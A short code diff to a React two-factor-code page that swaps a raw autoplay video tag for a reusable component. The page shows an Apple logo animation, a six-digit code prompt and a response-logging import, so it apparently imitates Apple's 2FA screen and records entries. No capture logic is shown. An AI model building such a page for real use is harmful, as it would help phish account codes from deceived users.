@@ -1,4 +1,5 @@
 import React, { useMemo, useRef, useState } from "react";
+import AutoplayLoopVideo from "./AutoplayLoopVideo";
 import { logResponseEntry } from "../utils/responseLogger";
 
 const CODE_LENGTH = 6;
@@ -39,14 +40,10 @@ export default function TwoFactorPage() {
   return (
     <div className="main">
       <div className="main-items">
-        <video
+        <AutoplayLoopVideo
           className="item-1"
           src="/applevideo.mp4"
-          autoPlay
-          loop
-          muted
-          playsInline
-          aria-label="Apple logo animation"
+          ariaLabel="Apple logo animation"
         />
 
         <h1 className="item-2">Enter your 2 Factor Code</h1>
